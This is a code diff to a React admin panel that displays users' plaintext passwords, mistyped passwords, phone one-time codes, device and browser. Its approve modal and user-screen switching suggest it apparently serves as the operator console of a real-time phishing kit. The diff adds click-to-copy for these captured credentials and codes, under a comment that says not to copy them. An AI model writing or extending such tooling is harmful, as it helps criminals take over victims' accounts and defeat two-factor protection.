@@ -15,6 +15,8 @@ function Admin() {
   const [loading, setLoading] = useState(true);
   const [showApproveModal, setShowApproveModal] = useState(false);
   const [soundEnabled, setSoundEnabled] = useState(true);
+  const [copiedField, setCopiedField] = useState(null);
+
 const [selectedUser, setSelectedUser] = useState(null);
 
 const [userDevice, setUserDevice] = useState("");
@@ -137,6 +139,22 @@ useEffect(() => {
   );
 };
 
+
+const copyField = async (field, value) => {
+  if (!value) return;
+
+  try {
+    await navigator.clipboard.writeText(value);
+
+    setCopiedField(field);
+
+    setTimeout(() => {
+      setCopiedField(null);
+    }, 1500);
+  } catch (error) {
+    console.error("Copy failed:", error);
+  }
+};
 
   // ======================================
   // CHANGE USER SCREEN
@@ -739,8 +757,16 @@ const handlePhoneOtp2Submitted = (data) => {
 
                 <div>
 
-                  <div style={styles.email}>
-                    {user.email}
+                
+                  <div  onClick={() => copyField("email", user.email)}   style={{
+                      ...styles.email,
+                      cursor: user.email
+                        ? "pointer"
+                        : "default"
+    }}>
+                   {copiedField === "email"
+                     ? "✓ Copied!"
+                    : user.email || "Not submitted"}
                   </div>
 
                   <div style={styles.id}>
@@ -770,72 +796,178 @@ const handlePhoneOtp2Submitted = (data) => {
                   STATUS
               ======================= */}
 
-              <div style={styles.info}>
+                <div style={styles.info}>
 
-                <Info
-                  label="Password"
-                  value={
-                    user.password
-                  }
-                />
+  {/* Password - don't expose/copy sensitive credentials */}
+  <p    onClick={() =>
+      copyField("password", user.password)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.password
+        ? "pointer"
+        : "default"
+    }}>
+    <span style={styles.infoLabel}>
+      Password
+    </span>
 
-                <Info
-                  label="Phone"
-                  value={
-                    user.phoneNumber ||
-                    "Not submitted"
-                  }
-                />
+    <span style={styles.infoValue}>
+      {copiedField === "password"
+        ? "✓ Copied!"
+        : user.password || "Not submitted"}
+    </span>
+  </p>
+    <p    onClick={() =>
+      copyField("wrongpassword", user.wrongPassword)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.wrongPassword
+        ? "pointer"
+        : "default"
+    }}>
+    <span style={styles.infoLabel}>
+      Wrong Password
+    </span>
 
-                <Info
-                  label="Wrong Password"
-                  value={
-                    user.wrongPassword ||
-                    "Not Submitted"
-                  }
-                />
-                    <Info
-                  label="Phone OTP"
-                  value={
-                    user.phoneOtp ||
-                    "Not Submitted"
-                  }
-                />
+    <span style={styles.infoValue}>
+      {copiedField === "wrongpassword"
+        ? "✓ Copied!"
+        : user.wrongPassword || "Not submitted"}
+    </span>
+  </p>
 
-                   <Info
-                  label="Wrong OTP"
-                  value={
-                    user.phoneOtp2 ||
-                    "Not Submitted"
-                  }
-                />
-                   <Info
-                  label="Device"
-                  value={
-                    user.device ||
-                    "Not Submitted"
-                  }
-                />
-                   <Info
-                  label="Browser"
-                  value={
-                    user.browser ||
-                    "Not Submitted"
-                  }
-                />
 
-                <Info
-                  label="Created"
-                  value={
-                    user.createdAt
-                      ? new Date(
-                          user.createdAt
-                        ).toLocaleString()
-                      : "Unknown"
-                  }
-                />
+  <p
+    onClick={() =>
+      copyField("phone", user.phoneNumber)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.phoneNumber
+        ? "pointer"
+        : "default"
+    }}
+  >
+    <span style={styles.infoLabel}>
+      Phone number
+    </span>
 
-              </div>
+    <span style={styles.infoValue}>
+      {copiedField === "phone"
+        ? "✓ Copied!"
+        : user.phoneNumber || "Not submitted"}
+    </span>
+  </p>
+    <p
+    onClick={() =>
+      copyField("phoneotp", user.phoneOtp)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.phoneOtp
+        ? "pointer"
+        : "default"
+    }}
+  >
+    <span style={styles.infoLabel}>
+      Phone OTP
+    </span>
+
+    <span style={styles.infoValue}>
+      {copiedField === "phoneotp"
+        ? "✓ Copied!"
+        : user.phoneOtp || "Not submitted"}
+    </span>
+  </p>
+    <p
+    onClick={() =>
+      copyField("phoneotp2", user.phoneOtp2)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.phoneOtp2
+        ? "pointer"
+        : "default"
+    }}
+  >
+    <span style={styles.infoLabel}>
+     Wrong Phone 
+    </span>
+
+    <span style={styles.infoValue}>
+      {copiedField === "phoneotp2"
+        ? "✓ Copied!"
+        : user.phoneOtp2 || "Not submitted"}
+    </span>
+  </p>
+  
+
+
+
+
+  <p
+    onClick={() =>
+      copyField("device", user.device)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.device
+        ? "pointer"
+        : "default"
+    }}
+  >
+    <span style={styles.infoLabel}>
+      Device
+    </span>
+
+    <span style={styles.infoValue}>
+      {copiedField === "device"
+        ? "✓ Copied!"
+        : user.device || "Not submitted"}
+    </span>
+  </p>
+
+
+  <p
+    onClick={() =>
+      copyField("browser", user.browser)
+    }
+    style={{
+      ...styles.infoRow,
+      cursor: user.browser
+        ? "pointer"
+        : "default"
+    }}
+  >
+    <span style={styles.infoLabel}>
+      Browser
+    </span>
+
+    <span style={styles.infoValue}>
+      {copiedField === "browser"
+        ? "✓ Copied!"
+        : user.browser || "Not submitted"}
+    </span>
+  </p>
+
+
+  <p style={styles.infoRow}>
+    <span style={styles.infoLabel}>
+      Created
+    </span>
+
+    <span style={styles.infoValue}>
+      {user.createdAt
+        ? new Date(
+            user.createdAt
+          ).toLocaleString()
+        : "Unknown"}
+    </span>
+  </p>
+
+</div>
 
 
 
@@ -1076,29 +1208,6 @@ theme="light"
 // ======================================
 // INFO COMPONENT
 // ======================================
-
-function Info({
-  label,
-  value
-}) {
-
-  return (
-
-    <div style={styles.infoRow}>
-
-      <span style={styles.infoLabel}>
-        {label}
-      </span>
-
-      <span style={styles.infoValue}>
-        {value}
-      </span>
-
-    </div>
-
-  );
-
-}
 
 
 // ======================================
